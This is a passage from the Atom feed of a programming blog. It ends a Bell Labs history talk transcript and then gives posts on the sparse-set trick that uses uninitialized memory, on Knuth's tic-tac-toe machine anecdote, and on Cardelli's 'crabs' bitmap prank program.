this word how was it translated.  You don’t want to be creative in translating technical text.  You’d like to be able to go back into the archives and pull up examples of translated text.  And the neat thing here is the idea for how do you align texts in two languages.  You’ve got the original, you’ve got the translated one, how do you bring up on the screen, the two sentences that go together?  And the following scam worked beautifully.  This is on western languages.  &lt;span style=&#34;font-size: 0.7em;&#34;&gt;62:33&lt;/span&gt;&#xA;Simply look for common four letter tetragrams, four letter combinations between the two and as best as you can, line them up as nearly linearly with the lengths of the two types as possible.  And this &lt;a href=&#34;church-tetragram.pdf&#34;&gt;very simple idea&lt;/a&gt; works like storm.  Something for nothing.  I like that.&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&lt;span style=&#34;font-size: 0.7em;&#34;&gt;63:10&lt;/span&gt;&#xA;The last thing is one slogan that sort of got started with Unix and is just rife within the industry now.  Software tools.  We were making software tools in Unix before we knew we were, just like the Molière character was amazed at discovering he’d been speaking prose all his life.  [laughter]  But then &lt;a href=&#34;http://www.amazon.com/-/dp/020103669X&#34;&gt;Kernighan and Plauger&lt;/a&gt; came along and christened what was going on, making simple generally useful and compositional programs to do one thing and do it well and to fit together.  They called it software tools, made a book, wrote a book, and this notion now is abroad in the industry.  And it really did begin all up in the little attic room where you [points?] sat for many years writing up here.&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt; Oh I forgot to.  I haven’t used any slides.  I’ve brought some, but I don’t like looking at bullets and you wouldn’t either, and I forgot to show you the one exhibit I brought, which I borrowed from Bob Kurshan.  When Bell Labs was founded, it had of course some calculating machines, and it had one wonderful computer.  This.  That was bought in 1918.  There’s almost no other computing equipment from any time prior to ten years ago that still exists in Bell Labs.  This is an &lt;a href=&#34;http://infolab.stanford.edu/pub/voy/museum/pictures/display/2-5-Mechanical.html&#34;&gt;integraph&lt;/a&gt;.  It has two styluses.  You trace a curve on a piece of paper with one stylus and the other stylus draws the indefinite integral here.  There was somebody in the math department who gave this service to the whole company, with about 24 hours turnaround time, calculating integrals.  Our recent vice president Arno Penzias actually did, he calculated integrals differently, with a different background.  He had a chemical balance, and he cut the curves out of the paper and weighed them.  This was bought in 1918, so it’s eighty years old.  It used to be shiny metal, it’s a little bit rusty now.  But it still works.&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&lt;span style=&#34;font-size: 0.7em;&#34;&gt;66:30&lt;/span&gt;&#xA;Well, that’s a once over lightly of a whole lot of things that have gone on at Bell Labs.  It’s just such a fun place that one I said I just could go on and on.  If you’re interested, there actually is a history written.  This is only one of about six volumes, &lt;a href=&#34;http://www.amazon.com/gp/product/0932764061&#34;&gt;this&lt;/a&gt; is the one that has the mathematical computer sciences, the kind of things that I’ve mostly talked about here.  A few people have copies of them.  For some reason, the AT&amp;T publishing house thinks that because they’re history they’re obsolete, and they stopped printing them.  [laughter]&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;Thank you, and that’s all.&lt;/p&gt;&lt;/p&gt;&#xA;&#xA;&#xA;&#xA;&#xA;&#xA;&#xA;</content>
  </entry>
  <entry>
    <title>Using Uninitialized Memory for Fun and Profit</title>
    <id>tag:research.swtch.com,2012:research.swtch.com/sparse</id>
    <link rel="alternate" href="http://research.swtch.com/sparse"></link>
    <published>2008-03-14T00:00:00-04:00</published>
    <updated>2008-03-14T00:00:00-04:00</updated>
    <summary type="text">An unusual but very useful data structure</summary>
    <content type="html">&#xA;&lt;p&gt;&lt;p class=lp&gt;&#xA;This is the story of a clever trick that&#39;s been around for&#xA;at least 35 years, in which array values can be left&#xA;uninitialized and then read during normal operations,&#xA;yet the code behaves correctly no matter what garbage&#xA;is sitting in the array.&#xA;Like the best programming tricks, this one is the right tool for the&#xA;job in certain situations.&#xA;The sleaziness of uninitialized data&#xA;access is offset by performance improvements:&#xA;some important operations change from linear&#xA;to constant time.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;Alfred Aho, John Hopcroft, and Jeffrey Ullman&#39;s 1974 book&#xA;&lt;i&gt;The Design and Analysis of Computer Algorithms&lt;/i&gt;&#xA;hints at the trick in an exercise (Chapter 2, exercise 2.12):&#xA;&lt;/p&gt;&#xA;&#xA;&lt;blockquote&gt;&#xA;Develop a technique to initialize an entry of a matrix to zero&#xA;the first time it is accessed, thereby eliminating the &lt;i&gt;O&lt;/i&gt;(||&lt;i&gt;V&lt;/i&gt;||&lt;sup&gt;2&lt;/sup&gt;) time&#xA;to initialize an adjacency matrix.&#xA;&lt;/blockquote&gt;&#xA;&#xA;&lt;p class=lp&gt;&#xA;Jon Bentley&#39;s 1986 book &lt;a href=&#34;http://www.cs.bell-labs.com/cm/cs/pearls/&#34;&gt;&lt;i&gt;Programming Pearls&lt;/i&gt;&lt;/a&gt; expands&#xA;on the exercise (Column 1, exercise 8; &lt;a href=&#34;http://www.cs.bell-labs.com/cm/cs/pearls/sec016.html&#34;&gt;exercise 9&lt;/a&gt; in the Second Edition):&#xA;&lt;/p&gt;&#xA;&#xA;&lt;blockquote&gt;&#xA;One problem with trading more space for less time is that&#xA;initializing the space can itself take a great deal of time.&#xA;Show how to circumvent this problem by designing a technique&#xA;to initialize an entry of a vector to zero the first time it is&#xA;accessed.  Your scheme should use constant time for initialization&#xA;and each vector access; you may use extra space proportional&#xA;to the size of the vector.  Because this method reduces&#xA;initialization time by using even more space, it should be&#xA;considered only when space is cheap, time is dear, and&#xA;the vector is sparse.&#xA;&lt;/blockquote&gt;&#xA;&#xA;&lt;p class=lp&gt;&#xA;Aho, Hopcroft, and Ullman&#39;s exercise talks about a matrix and&#xA;Bentley&#39;s exercise talks about a vector, but for now let&#39;s consider&#xA;just a simple set of integers.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;One popular representation of a set of &lt;i&gt;n&lt;/i&gt; integers ranging&#xA;from 0 to &lt;i&gt;m&lt;/i&gt; is a bit vector, with 1 bits at the&#xA;positions corresponding to the integers in the set.&#xA;Adding a new integer to the set, removing an integer&#xA;from the set, and checking whether a particular integer&#xA;is in the set are all very fast constant-time operations&#xA;(just a few bit operations each).&#xA;Unfortunately, two important operations are slow:&#xA;iterating over all the elements in the set&#xA;takes time &lt;i&gt;O&lt;/i&gt;(&lt;i&gt;m&lt;/i&gt;), as does clearing the set.&#xA;If the common case is that&#xA;&lt;i&gt;m&lt;/i&gt; is much larger than &lt;i&gt;n&lt;/i&gt;&#xA;(that is, the set is only sparsely&#xA;populated) and iterating or clearing the set&#xA;happens frequently, then it could be better to&#xA;use a representation that makes those operations&#xA;more efficient.  That&#39;s where the trick comes in.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;Preston Briggs and Linda Torczon&#39;s 1993 paper,&#xA;&amp;ldquo;&lt;a href=&#34;http://citeseer.ist.psu.edu/briggs93efficient.html&#34;&gt;&lt;b&gt;An Efficient Representation for Sparse Sets&lt;/b&gt;&lt;/a&gt;,&amp;rdquo;&#xA;describes the trick in detail.&#xA;Their solution represents the sparse set using an integer&#xA;array named &lt;code&gt;dense&lt;/code&gt; and an integer &lt;code&gt;n&lt;/code&gt;&#xA;that counts the number of elements in &lt;code&gt;dense&lt;/code&gt;.&#xA;The &lt;i&gt;dense&lt;/i&gt; array is simply a packed list of the elements in the&#xA;set, stored in order of insertion.&#xA;If the set contains the elements 5, 1, and 4, then &lt;code&gt;n = 3&lt;/code&gt; and&#xA;&lt;code&gt;dense[0] = 5&lt;/code&gt;, &lt;code&gt;dense[1] = 1&lt;/code&gt;, &lt;code&gt;dense[2] = 4&lt;/code&gt;:&#xA;&lt;/p&gt;&#xA;&#xA;&lt;center&gt;&#xA;&lt;img src=&#34;http://research.swtch.com/sparse0.png&#34; /&gt;&#xA;&lt;/center&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;Together &lt;code&gt;n&lt;/code&gt; and &lt;code&gt;dense&lt;/code&gt; are&#xA;enough information to reconstruct the set, but this representation&#xA;is not very fast.&#xA;To make it fast, Briggs and Torczon&#xA;add a second array named &lt;code&gt;sparse&lt;/code&gt;&#xA;which maps integers to their indices in &lt;code&gt;dense&lt;/code&gt;.&#xA;Continuing the example,&#xA;&lt;code&gt;sparse[5] = 0&lt;/code&gt;, &lt;code&gt;sparse[1] = 1&lt;/code&gt;,&#xA;&lt;code&gt;sparse[4] = 2&lt;/code&gt;.&#xA;Essentially, the set is a pair of arrays that point at&#xA;each other:&#xA;&lt;/p&gt;&#xA;&#xA;&lt;center&gt;&#xA;&lt;img src=&#34;http://research.swtch.com/sparse0b.png&#34; /&gt;&#xA;&lt;/center&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;Adding a member to the set requires updating both of these arrays:&#xA;&lt;/p&gt;&#xA;&#xA;&lt;pre class=indent&gt;&#xA;add-member(i):&#xA;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;dense[n] = i&#xA;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;sparse[i] = n&#xA;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;n++&#xA;&lt;/pre&gt;&#xA;&#xA;&lt;p class=lp&gt;&#xA;It&#39;s not as efficient as flipping a bit in a bit vector, but it&#39;s&#xA;still very fast and constant time.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;To check whether &lt;code&gt;i&lt;/code&gt; is in the set, you verify that&#xA;the two arrays point at each other for that element:&#xA;&lt;/p&gt;&#xA;&#xA;&lt;pre class=indent&gt;&#xA;is-member(i):&#xA;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;return sparse[i] &amp;lt; n &amp;&amp; dense[sparse[i]] == i&#xA;&lt;/pre&gt;&#xA;&#xA;&lt;p class=lp&gt;&#xA;If &lt;code&gt;i&lt;/code&gt; is not in the set, then &lt;i&gt;it doesn&#39;t matter what &lt;code&gt;sparse[i]&lt;/code&gt; is set to&lt;/i&gt;:&#xA;either &lt;code&gt;sparse[i]&lt;/code&gt;&#xA;will be bigger than &lt;code&gt;n&lt;/code&gt; or it will point at a value in&#xA;&lt;code&gt;dense&lt;/code&gt; that doesn&#39;t point back at it.&#xA;Either way, we&#39;re not fooled.  For example, suppose &lt;code&gt;sparse&lt;/code&gt;&#xA;actually looks like:&#xA;&lt;/p&gt;&#xA;&#xA;&lt;center&gt;&#xA;&lt;img src=&#34;http://research.swtch.com/sparse1.png&#34; /&gt;&#xA;&lt;/center&gt;&#xA;&#xA;&lt;p class=lp&gt;&#xA;&lt;code&gt;Is-member&lt;/code&gt; knows to ignore&#xA;members of sparse that point past &lt;code&gt;n&lt;/code&gt; or that&#xA;point at cells in &lt;code&gt;dense&lt;/code&gt; that don&#39;t point back,&#xA;ignoring the grayed out entries:&#xA;&#xA;&lt;center&gt;&#xA;&lt;img src=&#34;http://research.swtch.com/sparse2.png&#34; /&gt;&#xA;&lt;/center&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;Notice what just happened:&#xA;&lt;code&gt;sparse&lt;/code&gt; can have &lt;i&gt;any arbitrary values&lt;/i&gt; in&#xA;the positions for integers not in the set,&#xA;those values actually get used during membership&#xA;tests, and yet the membership test behaves correctly!&#xA;(This would drive &lt;a href=&#34;http://valgrind.org/&#34;&gt;valgrind&lt;/a&gt; nuts.)&#xA;&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;Clearing the set can be done in constant time:&#xA;&lt;/p&gt;&#xA;&lt;pre class=indent&gt;&#xA;clear-set():&#xA;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;n = 0&#xA;&lt;/pre&gt;&#xA;&#xA;&lt;p class=lp&gt;&#xA;Zeroing &lt;code&gt;n&lt;/code&gt; effectively clears&#xA;&lt;code&gt;dense&lt;/code&gt; (the code only ever accesses&#xA;entries in dense with indices less than &lt;code&gt;n&lt;/code&gt;), and&#xA;&lt;code&gt;sparse&lt;/code&gt; can be uninitialized, so there&#39;s no&#xA;need to clear out the old values.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;This sparse set representation has one more trick up its sleeve:&#xA;the &lt;code&gt;dense&lt;/code&gt; array allows an&#xA;efficient implementation of set iteration.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;pre class=indent&gt;&#xA;iterate():&#xA;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;for(i=0; i&amp;lt;n; i++)&#xA;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;yield dense[i]&#xA;&lt;/pre&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;Let&#39;s compare the run times of a bit vector&#xA;implementation against the sparse set:&#xA;&lt;/p&gt;&#xA;&lt;center&gt;&#xA;&lt;table&gt;&#xA;&lt;tr&gt;&#xA;  &lt;td&gt;&lt;i&gt;Operation&lt;/i&gt;&#xA;  &lt;td align=center width=10&gt;&#xA;  &lt;td align=center&gt;&lt;i&gt;Bit Vector&lt;/i&gt;&#xA;  &lt;td align=center width=10&gt;&#xA;  &lt;td align=center&gt;&lt;i&gt;Sparse set&lt;/i&gt;&#xA;&lt;/tr&gt;&#xA;&lt;tr&gt;&#xA;  &lt;td&gt;is-member&#xA;  &lt;td&gt;&#xA;  &lt;td align=center&gt;&lt;i&gt;O&lt;/i&gt;(1)&#xA;  &lt;td&gt;&#xA;  &lt;td align=center&gt;&lt;i&gt;O&lt;/i&gt;(1)&#xA;&lt;/tr&gt;&#xA;&lt;tr&gt;&#xA;  &lt;td&gt;add-member&#xA;  &lt;td&gt;&#xA;  &lt;td align=center&gt;&lt;i&gt;O&lt;/i&gt;(1)&#xA;  &lt;td&gt;&#xA;  &lt;td align=center&gt;&lt;i&gt;O&lt;/i&gt;(1)&#xA;&lt;/tr&gt;&#xA;&lt;tr&gt;&#xA;  &lt;td&gt;clear-set&#xA;  &lt;td&gt;&lt;td align=center&gt;&lt;i&gt;O&lt;/i&gt;(&lt;i&gt;m&lt;/i&gt;)&#xA;  &lt;td&gt;&lt;td align=center&gt;&lt;i&gt;O&lt;/i&gt;(1)&#xA;&lt;/tr&gt;&#xA;&lt;tr&gt;&#xA;  &lt;td&gt;iterate&#xA;  &lt;td&gt;&lt;td align=center&gt;&lt;i&gt;O&lt;/i&gt;(&lt;i&gt;m&lt;/i&gt;)&#xA;  &lt;td&gt;&lt;td align=center&gt;&lt;i&gt;O&lt;/i&gt;(&lt;i&gt;n&lt;/i&gt;)&#xA;&lt;/tr&gt;&#xA;&lt;/table&gt;&#xA;&lt;/center&gt;&#xA;&#xA;&lt;p class=lp&gt;&#xA;The sparse set is as fast or faster than bit vectors for&#xA;every operation.  The only problem is the space cost:&#xA;two words replace each bit.&#xA;Still, there are times when the speed differences are enough&#xA;to balance the added memory cost.&#xA;Briggs and Torczon point out that liveness sets used&#xA;during register allocation inside a compiler are usually&#xA;small and are cleared very frequently, making sparse sets the&#xA;representation of choice.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;Another situation where sparse sets are the better choice&#xA;is work queue-based graph traversal algorithms.&#xA;Iteration over sparse sets visits elements&#xA;in the order they were inserted (above, 5, 1, 4),&#xA;so that new entries inserted during the iteration&#xA;will be visited later in the same iteration.&#xA;In contrast, iteration over bit vectors visits elements in&#xA;integer order (1, 4, 5), so that new elements inserted&#xA;during traversal might be missed, requiring repeated&#xA;iterations.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;Returning to the original exercises, it is trivial to change&#xA;the set into a vector (or matrix) by making &lt;code&gt;dense&lt;/code&gt;&#xA;an array of index-value pairs instead of just indices.&#xA;Alternately, one might add the value to the &lt;code&gt;sparse&lt;/code&gt;&#xA;array or to a new array.&#xA;The relative space overhead isn&#39;t as bad if you would have been&#xA;storing values anyway.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;Briggs and Torczon&#39;s paper implements additional set&#xA;operations and examines performance speedups from&#xA;using sparse sets inside a real compiler.&#xA;&lt;/p&gt;&lt;/p&gt;&#xA;&#xA;&#xA;&#xA;&#xA;&#xA;&#xA;</content>
  </entry>
  <entry>
    <title>Play Tic-Tac-Toe with Knuth</title>
    <id>tag:research.swtch.com,2012:research.swtch.com/tictactoe</id>
    <link rel="alternate" href="http://research.swtch.com/tictactoe"></link>
    <published>2008-01-25T00:00:00-05:00</published>
    <updated>2008-01-25T00:00:00-05:00</updated>
    <summary type="text">The only winning move is not to play.</summary>
    <content type="html">&#xA;&lt;p&gt;&lt;p class=lp&gt;Section 7.1.2 of the &lt;b&gt;&lt;a href=&#34;http://www-cs-faculty.stanford.edu/~knuth/taocp.html#vol4&#34;&gt;Volume 4 pre-fascicle 0A&lt;/a&gt;&lt;/b&gt; of Donald Knuth&#39;s &lt;i&gt;The Art of Computer Programming&lt;/i&gt; is titled &amp;#8220;Boolean Evaluation.&amp;#8221;  In it, Knuth considers the construction of a set of nine boolean functions telling the correct next move in an optimal game of tic-tac-toe.  In a footnote, Knuth tells this story:&lt;/p&gt;&#xA;&#xA;&lt;blockquote&gt;&lt;p class=lp&gt;This setup is based on an exhibit from the early 1950s at the Museum of Science and Industry in Chicago, where the author was first introduced to the magic of switching circuits.  The machine in Chicago, designed by researchers at Bell Telephone Laboratories, allowed me to go first; yet I soon discovered there was no way to defeat it.  Therefore I decided to move as stupidly as possible, hoping that the designers had not anticipated such bizarre behavior.  In fact I allowed the machine to reach a position where it had two winning moves; and it seized &lt;i&gt;both&lt;/i&gt; of them!  Moving twice is of course a flagrant violation of the rules, so I had won a moral victory even though the machine had announced that I had lost.&lt;/p&gt;&lt;/blockquote&gt;&#xA;&#xA;&lt;p class=lp&gt;&#xA;That story alone is fairly amusing.  But turning the page, the reader finds a quotation from Charles Babbage&#39;s &lt;i&gt;&lt;a href=&#34;http://onlinebooks.library.upenn.edu/webbin/book/lookupid?key=olbp36384&#34;&gt;Passages from the Life of a Philosopher&lt;/a&gt;&lt;/i&gt;, published in 1864:&lt;/p&gt;&#xA;&#xA;&lt;blockquote&gt;&lt;p class=lp&gt;I commenced an examination of a game called &amp;#8220;tit-tat-to&amp;#8221; ... to ascertain what number of combinations were required for all the possible variety of moves and situations.  I found this to be comparatively insignificant. ... A difficulty, however, arose of a novel kind.  When the automaton had to move, it might occur that there were two different moves, each equally conducive to his winning the game. ... Unless, also, some provision were made, the machine would attempt two contradictory motions.&lt;/p&gt;&lt;/blockquote&gt;&#xA;&#xA;&lt;p class=lp&gt;&#xA;The only real winning move is not to play.&lt;/p&gt;&lt;/p&gt;&#xA;&#xA;&#xA;&#xA;&#xA;&#xA;&#xA;</content>
  </entry>
  <entry>
    <title>Crabs, the bitmap terror!</title>
    <id>tag:research.swtch.com,2012:research.swtch.com/crabs</id>
    <link rel="alternate" href="http://research.swtch.com/crabs"></link>
    <published>2008-01-09T00:00:00-05:00</published>
    <updated>2008-01-09T00:00:00-05:00</updated>
    <summary type="text">A destructive, pointless violation of the rules</summary>
    <content type="html">&#xA;&lt;p&gt;&lt;p class=lp&gt;Today, window systems seem as inevitable as hierarchical file systems, a fundamental building block of computer systems.  But it wasn&#39;t always that way.  This paper could only have been written in the beginning, when everything about user interfaces was up for grabs.&lt;/p&gt;&#xA;&#xA;&lt;blockquote&gt;&lt;p class=lp&gt;A bitmap screen is a graphic universe where windows, cursors and icons live in harmony, cooperating with each other to achieve functionality and esthetics.  A lot of effort goes into making this universe consistent, the basic law being that every window is a self contained, protected world.  In particular, (1) a window shall not be affected by the internal activities of another window.  (2) A window shall not be affected by activities of the window system not concerning it directly, i.e. (2.1) it shall not notice being obscured (partially or totally) by other windows or obscuring (partially or totally) other windows, (2.2) it shall not see the &lt;i&gt;image&lt;/i&gt; of the cursor sliding on its surface (it can only ask for its position).&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;Of course it is difficult to resist the temptation to break these rules.  Violations can be destructive or non-destructive, useful or pointless.  Useful non-destructive violations include programs printing out an image of the screen, or magnifying part of the screen in a &lt;i&gt;lens&lt;/i&gt; window.  Useful destructive violations are represented by the &lt;i&gt;pen&lt;/i&gt; program, which allows one to scribble on the screen.  Pointless non-destructive violations include a magnet program, where a moving picture of a magnet attracts the cursor, so that one has to continuously pull away from it to keep working.  The first pointless, destructive program we wrote was &lt;i&gt;crabs&lt;/i&gt;.&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&#xA;&lt;p class=lp&gt;As the crabs walk over the screen, they leave gray behind, &amp;#8220;erasing&amp;#8221; the apps underfoot:&lt;/p&gt;&#xA;&lt;blockquote&gt;&lt;img src=&#34;http://research.swtch.com/crabs1.png&#34;&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;p class=lp&gt;&#xA;For the rest of the story, see Luca Cardelli&#39;s &amp;#8220;&lt;a style=&#34;font-weight: bold;&#34; href=&#34;http://lucacardelli.name/Papers/Crabs.pdf&#34;&gt;Crabs: the bitmap terror!&lt;/a&gt;&amp;#8221; (6.7MB).  Additional details in &amp;#8220;&lt;a href=&#34;http://lucacardelli.name/Papers/Crabs%20%28History%20and%20Screen%20Dumps%29.pdf&#34;&gt;Crabs (History and Screen Dumps)&lt;/a&gt;&amp;#8221; (57.1MB).&lt;/p&gt;&lt;/p&gt;&#xA;&#xA;&#xA;&#xA;&#xA;&#xA;&#xA;</content>
  </entry>
</feed>